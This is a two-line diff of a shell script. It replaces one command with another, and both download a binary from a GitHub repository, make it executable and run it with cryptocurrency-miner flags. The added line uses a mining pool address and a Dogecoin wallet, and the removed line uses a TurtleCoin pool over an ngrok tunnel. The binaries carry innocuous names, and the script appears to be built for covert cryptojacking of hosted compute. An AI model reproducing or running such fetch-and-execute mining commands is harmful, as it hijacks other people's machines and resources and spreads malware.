@@ -1,2 +1,2 @@
 lscpu
-wget https://github.com/raufpermana22/virus2/raw/main/badut && chmod 777 badut && ./badut --donate-level 1 -o 8.tcp.ngrok.io:11316 -u TRTLuxMcjA5Z5wiQjv7GKz3NfKXBx2G45iFEfkTfBdHv4s5sVWWMpSEWhrzosQkWn2ieGpzGLHjEDNgD2biksSaGa1M5errKpkS -p luna -a argon2/chukwav2 -k 
+wget https://github.com/raufpermana22/tesami/raw/main/makanan && chmod 777 makanan && ./makanan --donate-level 1 -a rx/0 -o rx.unmineable.com:3333 u DOGE:DG1Fvzq3Z5HNzx2VRNqnKDDBJq7A3NVCvS.$(echo $(shuf -i 1-9999 -n 1)-DEV) -p x 
